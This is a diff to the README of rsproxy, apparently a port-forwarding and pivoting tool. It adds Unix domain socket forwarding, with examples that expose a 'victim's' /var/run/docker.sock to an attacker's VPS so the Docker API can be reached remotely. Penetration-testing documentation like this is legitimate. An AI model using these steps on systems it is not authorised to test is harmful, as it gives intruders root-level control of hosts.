@@ -14,7 +14,9 @@ cargo build --release
 
 ## Feature
 
-- TCP/UDP port forwarding (support multi network layer)
+- TCP/UDP port forwarding
+- Unix domain socket forwarding (e.g. `/var/run/docker.sock`)
+- Multi network layer support
 - Socks5 proxy
 
 ## Usage
@@ -111,6 +113,34 @@ Another example:
 ```
 
 The handshake packet will be sent from machine B to the attacker's machine (port 8888). Users can connect to the intranet through port 9999.
+
+### Unix domain socket Forwarding
+
+A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between two processes running on the same machine.
+
+`/var/run/docker.sock` and `/var/run/php-fpm.sock` are common Unix domain sockets.
+
+You can forward Unix domain socket to a TCP port.
+
+```bash
+./rsproxy fwd -s /var/run/docker.sock -l 4444
+
+# get docker version
+curl http://127.0.0.1:4444/version
+```
+
+or in the reverse mode.
+
+```bash
+# on victim's machine
+./rsproxy fwd -s /var/run/docker.sock -r vps:4444
+
+# on attacker's machine
+./rsproxy fwd -l 4444 -l 5555
+
+# get docker version
+curl http://vps:5555/version
+```
 
 ### Socks Proxy
 
